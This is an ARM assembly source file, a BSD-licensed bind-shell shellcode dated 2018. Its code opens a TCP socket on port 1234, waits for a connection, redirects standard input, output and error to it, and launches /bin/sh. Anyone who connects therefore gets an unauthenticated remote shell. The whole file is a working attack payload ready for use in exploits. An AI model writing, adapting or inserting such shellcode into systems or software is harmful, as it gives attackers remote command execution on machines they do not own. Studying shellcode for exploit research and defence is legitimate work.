 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
    .arch armv7-a
    
    .include "include.inc"
    
    .global _start
    .text

_start:
    .arm
    ldr     r4, =#0xD204FF02 // htons(1234), AF_INET
    ldr     r5, =#0x6e69622f // /bin
    ldr     r6, =#0x68732f2f // //sh
    
    // switch to thumb mode
    add     r3, pc, #1
    bx      r3 
  
    .thumb
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor     r2, r2       // r2 = IPPROTO_IP
    mov     r1, #SOCK_STREAM
    lsl     r7, r1, #8   // r7 = 1*256
    add     r7, #25      // r7 = 281 = socket 
    mov     r0, #AF_INET
    svc     1
    
    mov     r8, r0       // r8 = s
    
    // bind(s, &sa, sizeof(sa)); 
    mov     r1, r4 
    push    {r1, r2}     // save sa on stack
    mov     r1, sp       // r1 = &sa
    strb    r2, [r1, #1] // null the 0xFF in sa.family 
    mov     r2, #16      // sizeof(sa) 
    add     r7, #1       // r7 = 281+1 = 282 = bind
    svc     1
  
    // listen(s, 1);
    mov     r1, #1       // r1 = 1    
    mov     r0, r8       // r0 = s
    add     r7, #2       // r7 = 282+2 = 284 = listen 
    svc     1    
    
    // r = accept(s, 0, 0);
    eor     r2, r2       // r2 = 0
    eor     r1, r1       // r1 = 0
    mov     r0, r8       // r0 = s
    add     r7, #1       // r7 = 284+1 = 285 = accept    
    svc     1    
    
    mov     r8, r0       // r8 = r
    
    // dup2(r, STDIN_FILENO);
    // dup2(r, STDOUT_FILENO);
    // dup2(r, STDERR_FILENO);
    mov     r1, #3       // for 3 descriptors
c_dup:
    mov     r7, #SYS_dup2
    mov     r0, r8       // r0 = r
    sub     r1, #1 
    svc     1
    bne     c_dup        // while (r1 != 0)

    // execve("/bin/sh", NULL, NULL);
    mov     r7, r2 
    push    {r5, r6, r7}    
    mov     r0, sp       // r0 = "/bin/sh" 
    mov     r7, #SYS_execve
    svc     1
    nop
